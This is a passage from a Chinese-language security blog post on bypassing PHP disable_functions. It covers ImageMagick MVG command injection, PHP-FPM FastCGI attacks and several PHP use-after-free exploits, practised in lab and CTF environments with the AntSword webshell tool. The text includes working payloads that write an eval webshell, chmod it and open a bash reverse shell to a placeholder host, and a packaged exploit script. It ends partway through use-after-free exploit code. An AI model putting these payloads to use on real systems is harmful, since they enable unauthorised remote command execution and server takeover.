constant">5RGQ0NDQ0NDQ0NDQ0NDQ0NDQ</span>0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0PzMWtyaGhoaGhoaGhoaGhoaGhoxtb0QGhoaGhoaGhoaGhoaGhoaMbRLEvv50VTQ9OTQ5OpyZ01GpM2g0bfmDQaL7S<span class="token operator">+</span>ofFC6xv3ZpxJiywakzbvd9r3RWPS9I2<span class="token operator">+</span>MWk0<span class="token operator">+</span>kbf0Hih9Y17U0nTHibrDDQ0NDQ0NDQ0NDQ0NDQ0NTXbRSL<span class="token operator">/</span>AK72o6GhoaGhoRlL8951vwsNDQ0NDQ1NDc0WyHtDTEhDQ0NDQ0NTS5MdGhoaGhoaGhoaGhoaGhoaGhoaGhoaGposzSHAAErMwwQ2HwRQAAAAAElFTkSuQmCC"<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token variable">$base64</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token variable">$imageBlob</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$base64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$imagick</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$imagick</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readImageBlob</span><span class="token punctuation">(</span><span class="token variable">$imageBlob</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: image/png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token variable">$imageBlob</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">readImageBlob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说我们要通过以post的方式img去传递，把我们的payload编码传递进去，然后执行</p><p><strong>写一句话木马payload</strong></p><pre><code>push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/1.jpg"|echo \'&lt;?php @eval($_POST[\'ant\']);?&gt;\' &gt; shell.php")'pop graphic-context</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008171433237.png" alt="img"></p><p>可以看到已经成功写入了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008171452306.png" alt="img"></p><p>上蚁剑连接</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/clipboard.png" alt="img"></p><p>无奈报错，但是我加了一下权限，能连接上了…..</p><pre><code>push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/1.jpg"|chmod 777 shell.php")'pop graphic-context</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008175709879.png" alt="img"></p><p><strong>反弹shell</strong></p><pre><code>push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/1.jpg"|bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1")'pop graphic-context</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008180356263.png" alt="img"></p><p>成功拿到了shell</p><p>集成的exp </p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"Disable Functions: "</span> <span class="token punctuation">.</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'disable_functions'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$command</span> <span class="token operator">=</span> <span class="token constant">PHP_SAPI</span> <span class="token operator">==</span> <span class="token string">'cli'</span> <span class="token operator">?</span> <span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$command</span> <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string">'id'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$exploit</span> <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>push graphic<span class="token operator">-</span>contextviewbox <span class="token number">0</span> <span class="token number">0</span> <span class="token number">640</span> <span class="token number">480</span>fill '<span class="token function">url</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//example.com/image.jpg"|$command")'</span>pop graphic<span class="token operator">-</span>context<span class="token constant">EOF</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"KKKK.mvg"</span><span class="token punctuation">,</span> <span class="token variable">$exploit</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readImage</span><span class="token punctuation">(</span><span class="token string">'KKKK.mvg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeImage</span><span class="token punctuation">(</span><span class="token string">'KKKK.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"KKKK.mvg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"KKKK.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用攻击PHP-FPM"><a href="#利用攻击PHP-FPM" class="headerlink" title="利用攻击PHP-FPM"></a><strong>利用攻击PHP-FPM</strong></h3><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a><strong>使用条件</strong></h4><ul><li>Linux 操作系统</li><li>PHP-FPM</li><li>存在可写的目录，需要上传 .so 文件</li></ul><p>像php-fpm很常见的未授权，授权，然后命令执行，ssrf去攻击等</p><p>先来看看回顾一下什么是CGI和apache的Mod CGI</p><p>因为在早期的web服务器中，所请求的都是http静态资源，存储在服务器上面，请求完之后再返回给服务器，而后来出现动态的脚本像PHP，那么web处理不了，于是就出现了CGI，而这CGI是服务器去FORK一个新的进程去启动的，然后处理动态脚本，最后在kill掉，效率自然而然比较低下。</p><p>Mod CGI 是Web 服务器可以内置 Perl 解释器或 PHP 解释器，做成一个模块，也就是说不用再去FORK一个新进程，就会自动启动</p><p>参考P牛的<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#fastcgi-record" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#fastcgi-record</a></p><h4 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a><strong>FastCGI</strong></h4><p>当然有了CGI，自然是解决了web服务器和php解释器之间的通信问题，然而还有一个效率低下的问题，就是需要创建进程启动CGI。后来就出现了FastCGI，跟CGI相比它启动完进程之后，不会再杀死进程，也就是可以一个请求实现多用。</p><p>它其实也是一种协议，针对http协议而言，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议</p><p>而http协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器</p><h4 id="FastCGI-record"><a href="#FastCGI-record" class="headerlink" title="FastCGI record"></a><strong>FastCGI record</strong></h4><p>fastcgi是由多个record构成的，而fastcgi也是有header和body的。服务器中间件将这两个封装好打包发送给某个语言后端，语言后端接受到之后进行指定的操作，再按照原来的封装发送给服务器中间件</p><p>来看看固定头的8个字节</p><pre><code>typedef struct {/* Header */unsigned char version; // 版本unsigned char type; // 本次record的类型unsigned char requestIdB1; // 本次record对应的请求idunsigned char requestIdB0;unsigned char contentLengthB1; // body体的大小unsigned char contentLengthB0;unsigned char paddingLength; // 额外块大小unsigned char reserved;/* Body */unsigned char contentData[contentLength];unsigned char paddingData[paddingLength];} FCGI_Record;</code></pre><h4 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a><strong>php-fpm</strong></h4><p>简单来说就是fastcgi的解释器，映照了前面说的，中间件服务器将封装好的数据包以TCP的形式发送给后端，就是发送给了fpm。</p><p>比如举个例子，用户访问 <a href="http://127.0.0.1/index.php?a=1&amp;b=2" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=1&amp;b=2</a> 时，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：</p><pre><code>{ 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&amp;b=2', 'REQUEST_URI': '/index.php?a=1&amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': "localhost", 'SERVER_PROTOCOL': 'HTTP/1.1'}</code></pre><p>其实phpcgi的攻击就是利用了php-fpm会去读取SCRIPT_FILENAME,这里也不做过多详解，主要就是PHP_VALUE和PHP_ADMIN_VALUE是PHP-FPM的两个环境变量，通过设置这两个让auto_prepend_file = php://input且allow_url_include = On</p><p>那么怎么设置？我们可以直接在报文中添加这两个PHP-FPM的环境变量来进行设置（直接看最后两行）</p><pre><code>{ 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&amp;b=2', 'REQUEST_URI': '/index.php?a=1&amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': "localhost", 'SERVER_PROTOCOL': 'HTTP/1.1' 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On'}</code></pre><p>看到在报文里面多了两个。但是SCRIPT_FILENAME选项需要我们设置一个服务端已存在的PHP文件，该选项是让PHP-FPM执行目标服务器上的文件，且由于security.limit_extensions项的限制导致只能执行PHP文件。</p><p>如果有环境可以直接</p><pre><code>find / -name *.php</code></pre><p>还有一个常见的</p><pre><code>/usr/local/lib/php/PEAR.php</code></pre><h4 id="如何构造攻击"><a href="#如何构造攻击" class="headerlink" title="如何构造攻击"></a><strong>如何构造攻击</strong></h4><p>默认的FPM的端口是9000，那么我们可以绕过web服务器，构造fastcgi协议，直接与fpm进行通信，同理就可以用我们的webshell达到绕过。</p><p>但是有3个限制</p><h5 id="一："><a href="#一：" class="headerlink" title="一："></a><strong>一：</strong></h5><p>在php-fpm里面已经讲到了，fpm的执行与SCRIPT_FILENAME有关，它是去执行这个路径下的文件的，但是如果这个路径下的文件不存在，那么就会返回404，所以我们得保证这个路径下得文件存在。常见的一个/usr/local/lib/php/PEAR.php。剩下的可以自己去找，前提是必须存在</p><h5 id="二："><a href="#二：" class="headerlink" title="二："></a><strong>二：</strong></h5><p>单单执行目标上面的文件还是不够，因为我们想要执行的是我们想要执行的文件，那么在php.ini中就有两个可以让我们执行任意的命令</p><p>auto_prepend_file 和 auto_append_file 。</p><p>auto_prepend_file的意思就是告诉PHP在执行目标文件之前，先包含auto_prepend_file中指定的文件，并且auto_prepend_file可以使用PHP伪协议；auto_append_file选项同理，区别在于执行目标文件之后才会包含指定文件。</p><p>所以我们设置auto_prepend_file 为php://input，那么就等于在执行任何 PHP 文件前都要包含一遍 POST 过去的内容。所以，只需要把待执行的代码放在 POST Body 中进行远程文件包含，这样就能做到任意代码执行了</p><h5 id="三："><a href="#三：" class="headerlink" title="三："></a><strong>三：</strong></h5><p>还有一个是allow_url_include，因为需要用到包含，而这个也是必须，如果不为ON是没办法利用的。当然这就用到了上面讲的PHP_VALUE和PHP_ADMIN_VALUE这两个fpm的环境变量，PHP_VALUE可以用来设置 php.ini，PHP_ADMIN_VALUE 则可以设置所有选项（disable_functions 选项除外）</p><p>最后的构造就是php-fpm里面的最后一个报文形式</p><p>攻击fpm的exp：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a><strong>攻击</strong></h4><p>启动我们的蚁剑环境</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009140339573.png" alt="img"></p><p>打开phpinfo查看</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009140516033.png" alt="img"></p><p>FastCGI模式，CGI模式是CGI/FastCGI</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009141513573.png" alt="img"></p><p>注意该模式下需要选择 PHP-FPM 的接口地址，需要自行找配置文件查 FPM 接口地址，默认的是 unix:/// 本地 Socket 这种的，如果配置成 TCP 的默认是 127.0.0.1:9000</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009141950988.png" alt="img"></p><p>点击开始，上传成功</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009141642131.png" alt="img"></p><p>这时候我们就可以在/var/www/html下看到创建的shell</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009141815342.png" alt="img"></p><p>之后回到蚁剑的首页创建一个副本，并且改名</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009142419760.png" alt="img"></p><p>然后打开终端就可以执行命令</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009142349345.png" alt="img"></p><h3 id="利用-GC-UAF"><a href="#利用-GC-UAF" class="headerlink" title="利用 GC UAF"></a><strong>利用 GC UAF</strong></h3><h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 - all versions to date</li></ul><p>exp:<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>此漏洞利用 PHP 垃圾收集器中存在三年的一个 <a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener">bug</a> ，通过PHP垃圾收集器中<strong>堆溢出</strong>来绕过 disable_functions 并执行系统命令</p><p><strong>攻击</strong></p><p>还是蚁剑的靶场，打开蚁剑</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009144749904.png" alt="img"></p><p>点击开始会跳出来一个新的终端</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009144820119.png" alt="img"></p><p>来看看exp的使用</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009145242413.png" alt="img"></p><p>在exp里面有一个pwn，里面放着我们想要执行的命令，当然一个个换肯定麻烦，可以修改为</p><pre><code>pwn("$_POST[cmd]");  </code></pre><p>就可以以POST的形式传递了</p><h3 id="利用-Backtrace-UAF"><a href="#利用-Backtrace-UAF" class="headerlink" title="利用 Backtrace UAF"></a><strong>利用 Backtrace UAF</strong></h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li><li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li></ul><p>原理：该漏洞利用在debug_backtrace()函数中使用了两年的一个 <a href="https://bugs.php.net/bug.php?id=76047" target="_blank" rel="noopener">bug</a>。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞。</p><p>exp：<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p><p>这个脚本跟上面的GC一样，也是修改pwn的位置</p><p>利用方式相同，有可以上传执行并且能访问的目录，就直接上传，不行就，上传到tmp目录或者别的能上传的，然后利用文件包含</p><pre><code>include("/tmp/xxx.php");&amp;cmd=xxx</code></pre><h3 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a><strong>Json Serializer UAF</strong></h3><h4 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a><strong>使用条件：</strong></h4><ul><li><p>Linux 操作系统</p></li><li><p>PHP 版本</p></li><li><ul><li>7.1 - all versions to date</li><li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul></li></ul><p>原理：</p><p>此漏洞利用json序列化程序中的释放后使用<a href="https://bugs.php.net/bug.php?id=77843" target="_blank" rel="noopener">漏洞</a>，利用json序列化程序中的堆溢出触发，以绕过 disable_functions 和执行系统命令。尽管不能保证成功，但它应该相当可靠的在所有服务器 api上使用</p><p>exp:<a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p><p>同样的方式修改exp</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009150502762.png" alt="img"></p><p>修改</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009150608392.png" alt="img"></p><p>上传</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009151002843.png" alt="img"></p><p>或者用蚁剑自带的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009151054097.png" alt="img"></p><p>执行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009151106742.png" alt="img"></p><h3 id="利用-SplDoublyLinkedList-UAC"><a href="#利用-SplDoublyLinkedList-UAC" class="headerlink" title="利用 SplDoublyLinkedList UAC"></a><strong>利用 SplDoublyLinkedList UAC</strong></h3><h4 id="使用条件：-1"><a href="#使用条件：-1" class="headerlink" title="使用条件："></a><strong>使用条件：</strong></h4><ul><li><p>PHP 版本</p></li><li><ul><li>PHP v7.4.10及其之前版本</li><li>PHP v8.0（Alpha）</li></ul></li></ul><p>详细介绍：<a href="https://www.freebuf.com/articles/web/251017.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/251017.html</a></p><p>原理：</p><p>PHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等</p><p>这里用了<a href="http://bmzclub.cn/" target="_blank" rel="noopener">bmzclub</a>的ezphp来进行实验</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009155419275.png" alt="img"></p><p>传入的命令不能超过25</p><p>先查看一下phpinfo看看disable_functions</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009155643262.png" alt="img"></p><p>可以看到禁用了很多</p><p>但是有一个姿势可以绕过长度的限制</p><pre><code>a=eval($_POST[1]);1=system('ls')</code></pre><p>但是这里限制了不能利用，所以就需要绕过disable_functions</p><p>连接蚁剑</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009160914089.png" alt="img"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009160932156.png" alt="img"></p><p>终端执行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009175308700.png" alt="img"></p><p><a href="https://xz.aliyun.com/t/8355#toc-3" target="_blank" rel="noopener">exp</a></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009175854506.png" alt="img"></p><p>脚本的这个位置时间修改flag的</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token number">120</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token variable">$x</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$i</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$result</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>     <span class="token variable">$result</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$address</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getPHPChunk</span><span class="token punctuation">(</span><span class="token variable">$maps</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /'</span><span class="token punctuation">;</span>  <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$maps</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">,</span> <span class="token variable">$end</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0x200000</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$length</span> <span class="token operator">&lt;=</span> <span class="token number">0x300000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">echo</span> <span class="token string">"[+]PHP Chunk: "</span> <span class="token punctuation">.</span> <span class="token variable">$start</span> <span class="token punctuation">.</span> <span class="token string">" - "</span> <span class="token punctuation">.</span> <span class="token variable">$end</span> <span class="token punctuation">.</span> 